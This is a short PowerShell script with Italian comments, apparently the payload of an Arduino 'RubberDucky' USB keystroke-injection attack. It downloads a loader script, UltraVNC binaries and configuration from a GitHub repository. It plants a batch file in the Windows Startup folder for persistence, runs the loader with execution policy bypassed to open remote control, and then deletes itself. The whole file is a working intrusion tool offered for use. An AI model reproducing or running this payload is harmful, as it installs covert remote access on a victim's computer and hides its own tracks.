# Percorsi
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
$emaDevPath = "$documentsPath\EmaDev"
$self = $MyInvocation.MyCommand.Definition

# Crea la dir
If (-Not (Test-Path -Path $emaDevPath)) {
    New-Item -Path $emaDevPath -ItemType Directory
}

# Scarica i file per il controllo remoto
Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/LOAD.ps1" -OutFile "$emaDevPath\LOAD.ps1"
Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/winvnc.exe" -OutFile "$emaDevPath\winvnc.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/UltraVNC.ini" -OutFile "$emaDevPath\UltraVNC.ini"

# Scarica lo script per accendere il client nella cartella di avvio di Windows
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/CONNECT.bat" -OutFile "$startupPath\CONNECT.bat"

# Avvia il server, assicurarsi che a questo punto il server sia in ascolto
powershell -ExecutionPolicy Bypass -File "$emaDevPath\LOAD.ps1"

# Sleep
Start-Sleep -Seconds 1

# Elimina questo script temporaneo
Remove-Item $self -Force
